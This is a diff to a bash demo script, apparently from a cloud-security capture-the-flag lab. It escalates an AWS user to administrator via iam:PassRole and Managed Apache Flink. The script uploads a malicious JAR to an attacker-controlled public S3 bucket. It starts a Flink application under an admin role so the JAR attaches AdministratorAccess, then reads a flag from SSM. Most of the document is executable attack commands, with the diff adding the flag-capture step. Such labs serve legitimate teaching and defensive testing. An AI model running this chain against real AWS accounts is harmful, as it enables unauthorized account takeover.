@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Cross-account demo script for iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication
 # This variant hosts the malicious JAR in an attacker-controlled S3 bucket (separate AWS account)
@@ -23,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -87,6 +90,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve readonly credentials for observation steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -97,6 +109,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"
@@ -104,17 +117,34 @@ echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# Source demo permissions library for validation restriction
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
 # Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -122,15 +152,16 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
     echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
     exit 1
 fi
-echo -e "${GREEN}Verified starting user identity${NC}\n"
+echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account IDs (victim + attacker)
 echo -e "${YELLOW}Step 3: Getting account IDs${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 VICTIM_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Victim Account ID: $VICTIM_ACCOUNT_ID"
 
-show_cmd "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
 ATTACKER_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text --profile "$ATTACKER_PROFILE" 2>&1)
 if [ $? -ne 0 ]; then
     echo -e "${RED}Error: Could not get attacker account identity using profile '$ATTACKER_PROFILE'${NC}"
@@ -139,19 +170,22 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 echo "Attacker Account ID: $ATTACKER_ACCOUNT_ID"
-echo -e "${GREEN}Retrieved account IDs${NC}\n"
+echo -e "${GREEN}✓ Retrieved account IDs${NC}\n"
 
+# [EXPLOIT]
 # Step 4: Verify we don't have admin permissions yet
-echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}Unexpectedly have admin permissions already${NC}"
+    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
-    echo -e "${GREEN}Confirmed: Cannot list IAM users (as expected)${NC}"
+    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
 fi
 echo ""
 
+# [EXPLOIT]
 # Step 5: Create attacker-controlled S3 bucket with public-read policy
 echo -e "${YELLOW}Step 5: Creating attacker-controlled S3 bucket with malicious JAR${NC}"
 ATTACKER_BUCKET_NAME="pl-attacker-kinesisanalytics-001-exploit-${ATTACKER_ACCOUNT_ID}"
@@ -160,7 +194,7 @@ echo "Attacker bucket: $ATTACKER_BUCKET_NAME"
 echo "Using attacker profile: $ATTACKER_PROFILE"
 
 # Create the bucket in the attacker account
-show_cmd "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
 if [ "$AWS_REGION" = "us-east-1" ]; then
     aws s3api create-bucket \
         --bucket "$ATTACKER_BUCKET_NAME" \
@@ -179,7 +213,7 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 ATTACKER_BUCKET_CREATED=true
-echo -e "${GREEN}Attacker bucket created${NC}"
+echo -e "${GREEN}✓ Attacker bucket created${NC}"
 
 # Upload the exploit JAR
 echo "Uploading exploit JAR to attacker bucket..."
@@ -190,18 +224,18 @@ if [ ! -f "$EXPLOIT_JAR_PATH" ]; then
     exit 1
 fi
 
-show_cmd "aws s3 cp exploit-jar/exploit.jar s3://$ATTACKER_BUCKET_NAME/exploit.jar --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3 cp exploit-jar/exploit.jar s3://$ATTACKER_BUCKET_NAME/exploit.jar --profile $ATTACKER_PROFILE"
 aws s3 cp "$EXPLOIT_JAR_PATH" "s3://$ATTACKER_BUCKET_NAME/exploit.jar" --profile "$ATTACKER_PROFILE" 2>&1
 
 if [ $? -ne 0 ]; then
     echo -e "${RED}Error: Failed to upload exploit JAR to attacker bucket${NC}"
     exit 1
 fi
-echo -e "${GREEN}Exploit JAR uploaded${NC}"
+echo -e "${GREEN}✓ Exploit JAR uploaded${NC}"
 
 # Disable S3 Block Public Access on the bucket (enabled by default since April 2023)
 echo "Disabling S3 Block Public Access on attacker bucket..."
-show_cmd "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
 aws s3api put-public-access-block \
     --bucket "$ATTACKER_BUCKET_NAME" \
     --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" \
@@ -211,7 +245,7 @@ if [ $? -ne 0 ]; then
     echo -e "${RED}Error: Failed to disable S3 Block Public Access on attacker bucket${NC}"
     exit 1
 fi
-echo -e "${GREEN}S3 Block Public Access disabled on bucket${NC}"
+echo -e "${GREEN}✓ S3 Block Public Access disabled on bucket${NC}"
 
 # Apply public-read bucket policy so the Flink service can read the JAR
 echo "Applying public-read bucket policy..."
@@ -231,7 +265,7 @@ BUCKET_POLICY=$(cat <<POLICYEOF
 POLICYEOF
 )
 
-show_cmd "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
 echo "$BUCKET_POLICY" | aws s3api put-bucket-policy \
     --bucket "$ATTACKER_BUCKET_NAME" \
     --policy file:///dev/stdin \
@@ -241,15 +275,17 @@ if [ $? -ne 0 ]; then
     echo -e "${RED}Error: Failed to apply bucket policy${NC}"
     exit 1
 fi
-echo -e "${GREEN}Public-read bucket policy applied${NC}"
+echo -e "${GREEN}✓ Public-read bucket policy applied${NC}"
 
 echo ""
 echo "Attacker S3 location: s3://$ATTACKER_BUCKET_NAME/exploit.jar"
 echo "Source code: exploit-jar/src/main/java/com/exploit/EscalationJob.java"
 echo "To rebuild: cd exploit-jar && ./build.sh (requires Docker)"
-echo -e "${GREEN}Attacker bucket ready with exploit JAR${NC}\n"
+echo -e "${GREEN}✓ Attacker bucket ready with exploit JAR${NC}\n"
 
+# [EXPLOIT]
 # Step 6: Create the Managed Apache Flink application referencing attacker bucket
+use_starting_creds
 echo -e "${YELLOW}Step 6: Creating Managed Apache Flink application with attacker-hosted malicious code${NC}"
 echo "Application name: $APP_NAME"
 echo "Runtime: FLINK-1_19"
@@ -283,7 +319,7 @@ cat > /tmp/kinesisanalytics-001-app-config.json << CONFIGEOF
 }
 CONFIGEOF
 
-show_attack_cmd "aws kinesisanalyticsv2 create-application --region $AWS_REGION --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json"
+show_attack_cmd "Attacker" "aws kinesisanalyticsv2 create-application --region $AWS_REGION --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json"
 APP_RESULT=$(aws kinesisanalyticsv2 create-application \
     --region $AWS_REGION \
     --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json \
@@ -300,15 +336,17 @@ APP_ARN=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationARN')
 APP_VERSION=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationVersionId')
 echo "Application ARN: $APP_ARN"
 echo "Application Version: $APP_VERSION"
-echo -e "${GREEN}Flink application created (referencing attacker bucket)${NC}\n"
+echo -e "${GREEN}✓ Flink application created (referencing attacker bucket)${NC}\n"
 
+# [EXPLOIT]
 # Step 7: Start the Flink application
+use_starting_creds
 echo -e "${YELLOW}Step 7: Starting the Flink application (privilege escalation trigger)${NC}"
 echo "This is the privilege escalation vector - the application starts with the admin"
 echo "service execution role and runs our malicious code which calls iam:AttachUserPolicy."
 echo "The JAR is fetched from the attacker-controlled bucket via the public bucket policy."
 
-show_attack_cmd "aws kinesisanalyticsv2 start-application --region $AWS_REGION --application-name $APP_NAME"
+show_attack_cmd "Attacker" "aws kinesisanalyticsv2 start-application --region $AWS_REGION --application-name $APP_NAME"
 START_RESULT=$(aws kinesisanalyticsv2 start-application \
     --region $AWS_REGION \
     --application-name "$APP_NAME" 2>&1)
@@ -320,9 +358,11 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-echo -e "${GREEN}Flink application start initiated${NC}\n"
+echo -e "${GREEN}✓ Flink application start initiated${NC}\n"
 
+# [OBSERVATION]
 # Step 8: Wait for application to reach RUNNING state and for privilege escalation
+use_readonly_creds
 echo -e "${YELLOW}Step 8: Waiting for Flink application to run and escalate privileges${NC}"
 echo "The application needs 2-5 minutes to start up. Once running, the malicious code"
 echo "executes immediately to attach AdministratorAccess to the starting user."
@@ -338,7 +378,7 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
     SECONDS_REMAINING=$((ELAPSED % 60))
 
     # Check application status
-    show_cmd "aws kinesisanalyticsv2 describe-application --region $AWS_REGION --application-name $APP_NAME --query 'ApplicationDetail.ApplicationStatus' --output text"
+    show_cmd "ReadOnly" "aws kinesisanalyticsv2 describe-application --region $AWS_REGION --application-name $APP_NAME --query 'ApplicationDetail.ApplicationStatus' --output text"
     APP_STATUS=$(aws kinesisanalyticsv2 describe-application \
         --region $AWS_REGION \
         --application-name "$APP_NAME" \
@@ -379,49 +419,48 @@ if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
 fi
 echo ""
 
-# Step 9: Verify admin access
+# [OBSERVATION]
+# Step 9: Verify privilege escalation success
 echo -e "${YELLOW}Step 9: Verifying privilege escalation success${NC}"
 
 # Wait for IAM propagation
 echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 
-# Confirm we're still the starting user
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
-export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
-
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
-CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $CURRENT_IDENTITY"
-echo ""
-
-# Check attached policies
+use_readonly_creds
 echo "Checking attached policies on starting user..."
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
 echo "$ATTACHED_POLICIES"
-echo -e "${GREEN}AdministratorAccess policy confirmed on $STARTING_USER${NC}"
+echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
 echo ""
 
-# Verify actual admin access
-echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 3 --output table"
-if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}Successfully listed IAM users!${NC}"
-    echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
+# [EXPLOIT]
+# Step 10: Capture the CTF flag
+# The starting user now has AdministratorAccess attached. Use those credentials to read the flag.
+use_starting_creds
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/kinesisanalytics-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
 else
-    echo -e "${RED}Failed to list users (IAM may still be propagating)${NC}"
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
 fi
 echo ""
 
 # Clean up temporary files
 rm -f /tmp/kinesisanalytics-001-app-config.json
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL! (Cross-Account Variant)${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED! (Cross-Account Variant)${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, kinesisanalytics:CreateApplication, kinesisanalytics:StartApplication)"
@@ -431,6 +470,7 @@ echo "4. Created Managed Apache Flink application referencing JAR in attacker bu
 echo "5. Started the application, passing $ADMIN_ROLE_NAME as the service execution role"
 echo "6. Flink app fetched JAR from attacker bucket and used admin role to attach AdministratorAccess"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER"
@@ -438,6 +478,7 @@ echo "  -> (kinesisanalytics:CreateApplication with S3 code from ATTACKER bucket
 echo "  -> Flink app fetches malicious JAR from s3://$ATTACKER_BUCKET_NAME/exploit.jar"
 echo "  -> (iam:PassRole + kinesisanalytics:StartApplication with $ADMIN_ROLE_NAME)"
 echo "  -> Flink job calls iam:AttachUserPolicy -> Admin"
+echo "  -> (ssm:GetParameter) -> CTF Flag"
 
 echo -e "\n${YELLOW}Cross-Account Detail:${NC}"
 echo "  Victim Account:   $VICTIM_ACCOUNT_ID"
